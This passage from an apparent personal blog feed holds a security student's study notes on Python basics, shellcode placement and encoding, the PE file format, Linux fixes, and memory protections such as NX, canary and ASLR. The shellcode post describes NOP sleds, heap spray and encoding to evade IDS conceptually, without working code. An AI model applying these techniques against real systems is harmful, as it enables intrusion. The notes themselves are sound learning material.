-m elf_x86_64 srop.o -o srop</p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Learning python</title>
      <link href="/2018/08/02/learning-python/"/>
      <url>/2018/08/02/learning-python/</url>
      <content type="html"><![CDATA[<p><em>最近将之前的博客逐渐搬运过来，因为可怜的服务器要到期了hhh</em></p><p><em>为了能够完成各色python脚本的编写，迫不得已入门python大法！ 以下为简易的py语法：</em></p><h1 id="Python-string"><a href="#Python-string" class="headerlink" title="Python string"></a>Python string</h1><ol><li><p>对于单个字符的编码，Python提供了ord()函数获取字符的整数表示，chr()函数把编码转换为对应的字符；</p><p>eg： ord(‘A’)  -&gt;65    chr(66) -&gt;B</p></li><li><p>对bytes类型的数据用带b前缀的单引号或双引号表示： x=b’abc’；</p></li><li><p>可以通过encode() 将Unicode表示的str编码为指定的 bytes；</p></li><li><p>格式化输出字符串：</p></li></ol><ul><li><p>c语言格式；</p></li><li><p>format 方法’aaaa{0}bbbb{1}cccccc……’.format(para1,para2…)参数会依次取代占位符{0} {1}{…}；</p></li></ul><h1 id="python-list-and-tuple"><a href="#python-list-and-tuple" class="headerlink" title="python list and tuple"></a>python list and tuple</h1><ol><li>list（列表） ：classmates = [‘elementl’, ‘element2’, [‘element31’,’element32’],’element4’]</li></ol><ul><li><p>len()得到元素个数；</p></li><li><p>classmates[-n]可以得到倒数第n个元素；</p></li><li><p>classmates.append(‘element’)追加元素到末尾；</p></li><li><p>insert(n,’element’)插入到指定位置；</p></li><li><p>pop()删除末尾元素；pop(i)删除指定位置元素；</p></li><li><p>classmates[n]=’element’直接替换为别的元素；</p></li><li><p>list元素可以是另一个list。</p></li></ul><ol start="2"><li>tuple（元组）： classmates = (‘elementl’, ‘element2’, (‘element31’,’element32’),’element4’)</li></ol><ul><li><p>一旦初始化就不能修改（每个元素指向不变），一定程度上相当于const；</p></li><li><p>获取元素方法与list相同；</p></li><li><p>当只有一个元素时  t=(1,) 需要使用’，’来消除歧义；</p></li><li><p>tuple中包含list元素时，list中的元素可以变，因为对tuple来说其指向并没有改变。</p></li></ul><h1 id="python-dic"><a href="#python-dic" class="headerlink" title="python dic"></a>python dic</h1><p>  （同c++map）</p><p>d = {‘key1’: value1, ‘key2’: value2, ‘key3’: value3}    =&gt;  d[‘key1’] -&gt;value1</p><p>为避免key不存在：</p><ul><li>‘key’ in d 不存在则返回False；       </li><li>d.get(‘key’,value) 不存在则返回value；</li><li>pop(key)可以删除key即对应的value。</li></ul><h1 id="python-set"><a href="#python-set" class="headerlink" title="python set"></a>python set</h1><ul><li><p>set也是一组key的集合但不储存value；key不能重复。</p></li><li><p>创建set需要提供一个list作为输入集合 s = set([1,2,3]);</p></li><li><p>add(key)添加key ；remove(key)删除key。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">和list比较，dict有以下几个特点：</span><br><span class="line"></span><br><span class="line">    查找和插入的速度极快，不会随着key的增加而变慢；</span><br><span class="line">    需要占用大量的内存，内存浪费多。</span><br><span class="line"></span><br><span class="line">而list相反：</span><br><span class="line"></span><br><span class="line">    查找和插入的时间随着元素的增加而增加；</span><br><span class="line">    占用空间小，浪费内存很少。</span><br><span class="line"></span><br><span class="line">所以，dict是用空间来换取时间的一种方法。</span><br></pre></td></tr></table></figure><h1 id="python-loop"><a href="#python-loop" class="headerlink" title="python loop"></a>python loop</h1><ol><li><p>for i in list/tuple:  把list或tuple中的每个元素带入i，执行之后缩进块的语句；</p><p>range()函数可以生成一个整数序列，list(range(n))可以将其转化为list；</p></li><li><p>while xxx：</p></li><li><p>break / continue 同c。</p></li></ol><h1 id="python-func"><a href="#python-func" class="headerlink" title="python func"></a>python func</h1><ul><li><p>空函数：pass用来做占位符，让代码格式正确。</p></li><li><p>可以返回多个值，实质上是返回的tuple；</p></li><li><p>None 为不变对象，需要时可以将函数的参数定义为不变对象，这样在每次调用时都是从初始定义的变量开始。（即python函数参数变量默认等于c语言的static，加上none可以去掉static）</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#Python2.7在一行输入多个数字的方法：</span><br><span class="line"></span><br><span class="line">         输入一个数字 m = int(raw_input())</span><br><span class="line"></span><br><span class="line">输入多个数字是 m, n,.... = map(int, raw_input().split())</span><br></pre></td></tr></table></figure><ul><li><p>可变参数：   函数 def funcname(‘*’args):定义一个参数数量不定的list/tuple L,  调用funcname(L)即可；</p></li><li><p>关键字参数：函数def funcname(a,b,’<em>‘’</em>‘kw):c为关键字参数（例如用户注册 ab为必填项 c为选填项）；调用时funcname(A,B,e=E,f=F);</p></li><li><p>命名关键字参数：函数def funcname(a,b,’<em>‘,c,d):’</em>‘后面为命名关键字参数，即选填项只能是定义的key；也可以是 def funcname(a,b,’<em>‘,c,d，e):可变参数</em>c后面的命名关键字参数不必再加’*’；对于前者，调用时funcname(A,B,c=C,d=D);</p></li></ul><h1 id="python-slice"><a href="#python-slice" class="headerlink" title="python slice"></a>python slice</h1><p>用于取一个list或tuple的部分元素:L = [‘element1’, ‘element2’, ‘element3’, ‘element4’, ‘element5’]</p><p>slice操作符使用：</p><p>  eg：取前三个元素 L[0:3] /L[:3]；取后两个元素L[-2:]；取倒数第二个元素L[-2:-1]；</p><p>  L[:10:2]前十个数里每两个取一个；L[::5]所有数每五个取一个；</p><h1 id="python-iteration"><a href="#python-iteration" class="headerlink" title="python iteration"></a>python iteration</h1><p>即循环遍历；</p><p>d = {‘a’: 1, ‘b’: 2, ‘c’: 3}</p><p>eg:</p><ul><li>循环迭代dict： for key in d://默认dict 迭代的是key ；<br>迭代value : for value in d.values()；<br>同时迭代 ：for k,v ind.items()</li></ul><ul><li>判断是否可迭代：通过collections模块的Iterable类型判断</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> from collections import Iterable </span><br><span class="line">isinstance(objects,Iterable)</span><br></pre></td></tr></table></figure><ul><li>下标循环的实现：通过内置的enumerate函数判断</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i, value in enumerate([&apos;A&apos;, &apos;B&apos;, &apos;C&apos;]):</span><br></pre></td></tr></table></figure><h1 id="python-list-generation"><a href="#python-list-generation" class="headerlink" title="python list generation"></a>python list generation</h1><p>eg：</p><ul><li><p>生成L=[1,4,9,….100]：<code>[x*x for x in range(1,100)]</code>;</p></li><li><p>筛选出仅偶数的平方：<code>[x*x for x in range(1,100) if x%2 ==0]</code>;</p></li><li><p>两层循环生成全排列：<code>[m+n for m in &#39;ABC&#39; for n in &#39;DEF&#39; ]</code>;</p></li><li><p>列出当前目录下所有文件即目录名：<code>import os  | [d for d in os.listdir(&#39;.&#39;)]</code>;</p></li><li><p>把一个list L 中所有字符串变为小写：<code>[s.lower() for s in L]</code>;</p></li></ul><h1 id="python-genarator"><a href="#python-genarator" class="headerlink" title="python genarator"></a>python genarator</h1><p>不必创建完整的list，节省大量空间；边循环边计算，称为生成器generator；</p><p>方法：将列表生成式的[]改为()即可；</p>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>The art 0f deploying shellcode</title>
      <link href="/2018/07/26/the-art-0f-deploying-shellcode/"/>
      <url>/2018/07/26/the-art-0f-deploying-shellcode/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em></p><h1 id="shellcode布置"><a href="#shellcode布置" class="headerlink" title="shellcode布置"></a>shellcode布置</h1><ol><li><p>将shellcode放在缓冲区中（静态地址），即函数返回地址之前。//shellcode自身可能会被压栈数据破坏，难以动态定位</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片1-2.png" alt="1" title="" class="">                <p>1</p>            </figure></li><li><p>使用jmp esp/call esp 指令作为跳板指令，定位shellcode，使shellcode正好布置在返回地址之后。//前栈帧数据被大范围破坏</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片2-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>为尽量避免1,2的缺点，可以使用跳转指令定位shellcode，同时将shellcode布置在缓冲区内。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片3-1.png" alt="3" title="" class="">                <p>3</p>            </figure></li><li><p>为了使shellcode具有通用性/安全性，通常会在shellcode一开始大范围抬高栈顶，保护自身代码的完整性。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片4-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>某些情况下不允许使用跳板指令，静态地址又不够准确。可以淹没大片内存的情况下，将shellcode布置在一大段nop之后。此时定位shellcode时，只要能够跳进一大片nop之中即可。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片5-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>返回地址距离缓冲区偏移量不确定。若函数返回地址按双字节不定，可以用一片连续的跳转指令的地址来覆盖函数返回地址，只要有其中一个可以成功覆盖，shellcode就能执行。（待理解）</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片7-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li><li><p>按字节错位引起定位失败从而使shellcode无效。使用按字节相同的双字跳转地址，甚至使用堆中的地址，将shellcode用堆扩展的方法放置在相应区域（Heap spray）。（待理解）</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片8-1.png" alt="2" title="" class="">                <p>2</p>            </figure><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片8-2.png" alt="2" title="" class="">                <p>2</p>            </figure></li></ol><h1 id="shellcode的编码技术"><a href="#shellcode的编码技术" class="headerlink" title="shellcode的编码技术"></a>shellcode的编码技术</h1><ul><li>原因：</li></ul><ol><li><p>所有的字符串函数都会对NULL字节进行限制，通常需要在shellcode中选择特殊的指令避免直接出现NULL字节或字。</p></li><li><p>有些函数还会要求shellcode必须为可见字符的ASCII值或Unicode值。</p></li><li><p>基于特征的IDS系统往往会对常见的shellcode进行拦截。</p><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片9-1.png" alt="2" title="" class="">                <p>2</p>            </figure><figure class="image-box">                <img src="/2018/07/26/the-art-0f-deploying-shellcode/图片10-1.png" alt="2" title="" class="">                <p>2</p>            </figure></li></ol><ul><li><p>解决：</p><p>编码。先编码使内容达到限制的要求，再构造解码程序放在shellcode开始执行的地方。</p></li></ul>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>What&#39;s PE files?</title>
      <link href="/2018/07/23/what-s-pe-files/"/>
      <url>/2018/07/23/what-s-pe-files/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em></p><h1 id="judge-PE"><a href="#judge-PE" class="headerlink" title="judge PE"></a>judge PE</h1><p>简单的判断文件是否为pe文件： </p><ol><li>pe 指纹： 开头为 4D 5A （MZ）； 3C 处为一个值 ； 查找该值的地址为 50 45（PE）。</li></ol><h1 id="PE-文件概论"><a href="#PE-文件概论" class="headerlink" title="PE 文件概论"></a>PE 文件概论</h1><p>PE（portable Executable）windows系统下的可执行文件格式</p><p>1 . 32位可执行文件-PE32 ；</p><pre><code>64位可执行文件-PE+/PE32+ ，是PE文件的扩展形式。</code></pre><ol start="2"><li><p>分类：可执行系列 exe scr ；库系列 dll ocx cpl drv ；驱动程序系列 sys vxd ；对象文件系列 obj （唯一不可执行）。</p></li><li><p>基本结构</p><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/1.png" alt="1" title="" class="">                <p>1</p>            </figure></li></ol><p>DOS头到节区头是PE的头部分；</p><p>文件中使用偏移offset，内存中使用VA（virtual address 虚拟地址）表示位置；</p><ol start="4"><li>VA指进程虚拟内存的绝对地址，RVA指从某个基准位置开始的相对地址。</li></ol><p>RVA+ImageBase=VA</p><h1 id="PE头-1"><a href="#PE头-1" class="headerlink" title="PE头(1)"></a>PE头(1)</h1><h2 id="DOS部分"><a href="#DOS部分" class="headerlink" title="DOS部分"></a>DOS部分</h2><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/2.png" alt="2" title="" class="">                <p>2</p>            </figure><ol><li>DOS头：IMAGE_DOS_HEADER结构体     –0x40个字节</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/3.png" alt="3" title="" class="">                <p>3</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e_magic:DOS签名（4D5A 签名值MZ）</span><br><span class="line">e_lfanew:指示NT头的偏移（小端序标识法）</span><br></pre></td></tr></table></figure><ol start="2"><li>DOS存根（stub）         –可选项，大小不固定/DOS环境才会执行</li></ol><h2 id="PE文件头部分"><a href="#PE文件头部分" class="headerlink" title="PE文件头部分"></a>PE文件头部分</h2><ol start="3"><li>NT头： IMAGE_NT_HEADERS结构体     –32位：0xF8个字节。64位： 0x108</li></ol><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/4.png" alt="4" title="" class="">                <p>4</p>            </figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">签名（50450000）</span><br><span class="line">标准PE header： 20个字节</span><br><span class="line">可选头。</span><br></pre></td></tr></table></figure><ul><li>标准PE header：IMAGE_FILE_HEADER结构体<figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/5.png" alt="5" title="" class="">                <p>5</p>            </figure>该结构体重要成员（设置不正确，程序无法运行）</li></ul><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/6.png" alt="6" title="" class="">                <p>6</p>            </figure><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/7.png" alt="7" title="" class="">                <p>7</p>            </figure><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/8.png" alt="8" title="" class="">                <p>8</p>            </figure><ul><li>可选头： IMAGE_OPTIONAL_HEADER32<figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/9.png" alt="9" title="" class="">                <p>9</p>            </figure>（PE头结构体中最大的）</li></ul><p>重要成员<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/10.png" alt="10" title="" class="">                <p>10</p>            </figure><br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/11.png" alt="11" title="" class="">                <p>11</p>            </figure><br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/12.png" alt="12" title="" class="">                <p>12</p>            </figure></p><ul><li>节区头： IMAGE_SECTION_HEADER<figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/13.png" alt="13" title="" class="">                <p>13</p>            </figure>不同内存属性访问权限：code  rwx /data rw /resource r<figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/14.png" alt="14" title="" class="">                <p>14</p>            </figure>重要成员</li></ul><h1 id="PE头-2"><a href="#PE头-2" class="headerlink" title="PE头(2)"></a>PE头(2)</h1><ol><li>内存地址与文件偏移间的映射：RVA to RAW（即file offset）</li></ol><p>公式：RAW - PointerToRawData = RVA -VirtualAddress</p><p>RAW = RVA -VirtualAddress + PointerToRawData<br><figure class="image-box">                <img src="/2018/07/23/what-s-pe-files/15.png" alt="15" title="" class="">                <p>15</p>            </figure><br>eg：</p><p>RVA = 5000 位于第一节区（.text），VA = 1000（该节区内存的的起始地址），</p><p>PointerToRawData= 400 （该节区文件的起始地址） 。</p><p>RAW = 5000 -1000 +400 =4400.</p><ol start="2"><li>DLL（动态链接库）</li></ol><p>不把库包含在程序中，而是单独组成DLL文件，需要时调用即可/更新库时只需要替换DLL文件即可/内存映射使加载后的DLL代码，资源在多个进程中实现共享。</p><p>Windows版本不同，环境不同，被调用函数的位置（地址）也不相同。</p><ul><li><p>为了确保在所有环境中都能正常调用被调用函数，编译器保存了被调用函数实际地址的位置。PE装载器将被调用函数的地址写到该位置。</p></li><li><p>DLL重定位。DLL的ImageBase默认为1000000，若某个程序使用a.dll与b.dll时，a已被装载到内存的10000000处，PE装载器只能查找其他空白的内存空间，将b装载进去。</p></li><li><p>PE头表示地址用RVA 而不是VA。</p></li></ul><p>3.IAT（Import Address Table 导入地址表）：用来记录程序正在使用库中的哪些函数。</p>]]></content>
      
      <categories>
          
          <category> RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>diary-20180720</title>
      <link href="/2018/07/20/diary-20180720/"/>
      <url>/2018/07/20/diary-20180720/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em><br>或许是因为复习时不怎么使用虚拟机，导致网络的某些配置出现了问题，按照网上的各种方法怎么也搞不好，历经小半天，终于解决。方法如下：</p><p>1.到根目录下/etc/network找到interfaces文件</p><p>2.</p><p>vi打开：<code>vi interfaces</code></p><p>此时发现，只有两行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br></pre></td></tr></table></figure><p>之所以不能联网是因为这个文件不完整。</p><p>讲这两行替换为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line">auto eth1</span><br><span class="line">iface eth1 inet dhcp</span><br><span class="line">auto eth2</span><br><span class="line">iface eth2 inet dhcp</span><br><span class="line">auto ath0</span><br><span class="line">iface ath0 inet dhcp</span><br><span class="line">auto wlan0</span><br><span class="line">iface wlan0 inet dhcp</span><br></pre></td></tr></table></figure><p>3.退出vi，启动项 <code>/etc/init.d/networking</code>，重启网络连接<code>sudo /etc/init.d/networking restart</code>，就ok了</p>]]></content>
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>diary-20180517</title>
      <link href="/2018/05/17/diary-20180517/"/>
      <url>/2018/05/17/diary-20180517/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em><br>kali在昨天晚上未更新完卡顿，为了睡觉，强制关机(这个真的不是好习惯，未来还会在在这上面栽跟头…）；then，今天开机时在用户名与密码之间无限循环；</p><p>寻求各色解法，e.g. vi /etc/profile  但是其文件正常，之后终于在误打误撞中解决。</p><p>步骤：<br><figure class="image-box">                <img src="/2018/05/17/diary-20180517/a" alt="1" title="(1).png" class="">                <p>(1).png</p>            </figure><br><figure class="image-box">                <img src="/2018/05/17/diary-20180517/a" alt="2" title="(2).png" class="">                <p>(2).png</p>            </figure></p><p>进入 recovery mode（也就是纯命令行模式）</p><p>输入用户密码</p><p>按理说 应该继续 apt-get update -f</p><p>但会提示 输入 dpkg –configure -a</p><p>完成后重新update 就ok啦</p><p>2018-12-5 </p><p>试着换了几个其他版本的linux，结果都不太合心意，最后还是回去修复了有些问题的gdb，暂时放弃了pwndbg的安装<br>kali 设定开机自动运行sh脚本方式不太一样，记在这里：</p><p>Debian定义了多个运行级别脚本，分别存放在/etc/rc0.d至/etc/rc6.d中，默认级别为5.</p><p>要增加开机自动运行脚本的方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/init.d/rc.local</span><br></pre></td></tr></table></figure><p>写入你需要运行的脚本，:wq退出，这里我将自己的脚本放到/usr/local/bin下，然后在rc.local下指定脚本路径：./usr/local/bin/automount，注意要给脚本执行权限，rc.local中也要加入点’ . ‘来执行脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /etc/init.d/rc.local #增加脚本执行权限</span><br><span class="line"></span><br><span class="line">update-rc.d rc.local start 99 2 3 4 5 . stop 01 0 1 6 . #设置启动级别</span><br></pre></td></tr></table></figure><p>若要删除脚本的启动级别运行如下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d -f rc.local remove</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn0.0 --Protection technology</title>
      <link href="/2018/05/13/protection-technology/"/>
      <url>/2018/05/13/protection-technology/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em></p><h1 id="NX保护和DEP保护"><a href="#NX保护和DEP保护" class="headerlink" title="NX保护和DEP保护"></a>NX保护和DEP保护</h1><p>两个保护措施都有相同点，都是使数据与代码分离，防止恶意代码被执行简单来说就是关闭了堆栈执行权限</p><h2 id="NX保护"><a href="#NX保护" class="headerlink" title="NX保护"></a>NX保护</h2><p>NX保护，全称为 “No eXecute” ，意为 [禁止执行]<br>我对它的理解即为栈上数据区域去除执行权限，就能防止大多数溢出攻击，即一些恶意程式，把自身的恶意指令集放在其他程式的数据储存区并执行。</p><p>linux最早的漏洞防护机制nx-stack刚刚出现后就有人想出了突破方法。那就是只有栈是不可执行，而除了栈以外的其他地方还是可以执行的，只要把返回地址执行别的地方就可以。</p><h2 id="DEP保护"><a href="#DEP保护" class="headerlink" title="DEP保护"></a>DEP保护</h2><p>DEP保护，全称为 Data Execution Prevention ，意为 数据执行保护</p><p>数据执行保护(DEP) 是一套软硬件技术，能够在内存上执行额外检查以帮助防止在系统上运行恶意代码</p><p>主要优点<br>我觉得这种保护技术组要应用于Windows</p><p>这种技术的保护方式和NX方式有相同的地方，也就是让堆和堆栈上的内容不可执行。 可帮助防止数据页当作代码执行，从而有效分离数据与代码。可写的不可执行，可执行的不可写。<br>百度百科上有这样一句话：</p><p>可以说，溢出是操作系统(应用软件)永远的痛，Windows 7自然也不例外。所谓溢出主要指缓冲区溢出，就是利用系统(应用软件)漏洞从只有Windows和其他程序可以使用的内存位置执行恶意代码从而达到控制系统的目的。如前所述，缓冲区溢出攻击经常在其它程序的内存缓冲区写入可执行的恶意代码，然后诱骗程序执行恶意代码。使用DEP的目的是阻止恶意插入代码的执行，其运行机制是，Windows利用DEP标记只包含数据的内存位置为非可执行(NX)，当应用程序试图从标记为NX的内存位置执行代码时，Windows的DEP逻辑将阻止应用程序这样做，从而达到保护系统防止溢出。</p><p>*P.S.好像这部分还分为硬件实施DEP和软件实施DEP，这个坑先留着吧，过些日子理解之后我再来填。</p><h1 id="Linux-Canary保护"><a href="#Linux-Canary保护" class="headerlink" title="Linux Canary保护"></a>Linux Canary保护</h1><p>Canary ，又名 金丝雀 ，是一个防止溢出修改ret的措施， Canary 是Linux众多安全保护机制中的一种，主要用于 防护栈溢出攻击 。我们知道，在32位系统上，对于栈溢出漏洞，攻击者通常是通过 溢出栈缓冲区 ， 覆盖栈上保存的函数返回地址 来达到 劫持程序执行流 的目的：<br>溢出栈缓冲区<br>劫持方式</p><figure class="image-box">                <img src="/2018/05/13/protection-technology/1.jpg" alt="1" title="" class="">                <p>1</p>            </figure><p>如上图所示我们只要能够精确计算出需要覆盖的长度是多少，就能精确覆盖ret的地址，达到攻击效果。<br>然而，针对此种攻击情况，如果在函数返回之前，我们能够判断ret地址是否被改写，若被改写则终止程序的执行，便可以有效地应对攻击。如何做到呢？一个很自然的想法是在刚进入函数时，在栈上放置一个标志，在函数结束时，判断该标志是否被改变，如果被改变，则表示有攻击行为发生。 Linux Canary保护机制 便是如此，如下：</p><figure class="image-box">                <img src="/2018/05/13/protection-technology/2.jpg" alt="1" title="" class="">                <p>1</p>            </figure><p>攻击者如果要通过栈溢出覆盖ret，则必先覆盖Canary。如果我们能判断Canary前后是否一致，便能够判断是否有攻击行为发生。</p><p>注：上述图例仅用于说明，实际上canary并不一定是与栈上保存的BP地址相邻的。</p><h1 id="ASLR地址空间布局随机化"><a href="#ASLR地址空间布局随机化" class="headerlink" title="ASLR地址空间布局随机化"></a>ASLR地址空间布局随机化</h1><p>ASLR ，全称为 Address space layout randomization<br>顾名思义，这个保护措施的主要内容就是把地址给随机化了，用以增加攻击者对地址预测的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的的一种技术。</p><p>但是这个措施只是能降低缓冲区溢出攻击的成功率，并不是能完全防止溢出。</p><p>关于这个，多的我也说不上来，给几个文章的地址吧。</p><h1 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h1><p>PIE ，全称为 position-independent executables<br>一般情况下NX和地址空间分布随机化会同时工作。在linux下内存空间随机化被称作PIE。</p><p>内存地址随机化机制，有以下三种情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参数 意义</span><br><span class="line">0 表示关闭进程地址空间随机化</span><br><span class="line">1 表示将mmap的基址，stack和vdso页面随机化</span><br><span class="line">2 表示在1的基础上增加栈（heap）的随机化</span><br></pre></td></tr></table></figure><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。<br><em>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</em></p><h1 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h1><p>这个好像是编译器的保护措施，将函数名改变了，从而达到防止缓冲区溢出的作用。具体的坑emmm等我以后学会了些再来填吧。</p><p>系统防护（全）：<br><a href="http://www.mamicode.com/info-detail-1990426.html" title="1" target="_blank" rel="noopener">二进制的保护机制</a><br><a href="https://blog.csdn.net/x_nirvana/article/details/61420056" title="2" target="_blank" rel="noopener">WINDOWS和LINUX的内存防护机制</a></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JavaScript Naughts and Crosses</title>
      <link href="/2018/01/24/javascript-naughts-and-crosses/"/>
      <url>/2018/01/24/javascript-naughts-and-crosses/</url>
      <content type="html"><![CDATA[<p><em>转移自之前的博客</em></p><p>学习html,js,css一周做了个粗糙的人机井字棋，虽然很丑，但是有彩蛋啊，比如说：黑白图片来自我c语言课设那刷屏的烫烫烫hhh。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span 